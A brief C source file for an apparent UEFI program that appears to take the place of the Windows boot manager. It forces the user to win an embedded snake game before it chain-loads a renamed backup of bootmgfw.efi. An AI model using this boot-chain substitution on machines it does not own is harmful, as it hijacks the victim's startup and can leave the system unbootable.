#undef __STDC_VERSION__
#include <efi.h>   
#include <uefi.h>  

#include "bootlib.h"
#include "snake_payload.h"

CHAR16 *OriginalLoader = L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
CHAR16 *BackupLoader   = L"\\EFI\\Microsoft\\Boot\\bootmgfw_ms.efi";

int main(int argc, char **argv) {
    BOOLEAN won = FALSE;
    while(!won){
        if(runEmbeddedSnake(IM) == 0)
            won = TRUE;
    }

    bootFile(IM, BackupLoader);

    
    return 0;
}

